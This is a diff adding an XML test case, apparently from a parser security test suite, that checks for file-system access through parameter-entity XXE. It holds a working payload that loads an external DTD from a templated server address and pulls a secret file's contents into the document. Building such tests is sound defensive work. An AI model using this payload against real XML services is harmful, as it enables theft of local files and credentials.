@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--;testcase
+[General]
+name: XXE FSA Attack (PE)
+description: File System Access via External Entity Expansion (Parameter Entity Version)
+
+[File secret_txt]
+path: secret.txt
+
+[ServerResponse /xxe-pe.dtd]
+access_allowed: True
+content: xxe-pe.dtd
+-->
+<!DOCTYPE data [
+  <!ELEMENT data (#PCDATA)>
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % goodies SYSTEM "{files.secret_txt.url}">
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://{server_address}/xxe-pe.dtd">
+  %dtd;
+]>
+<data>&all;</data>
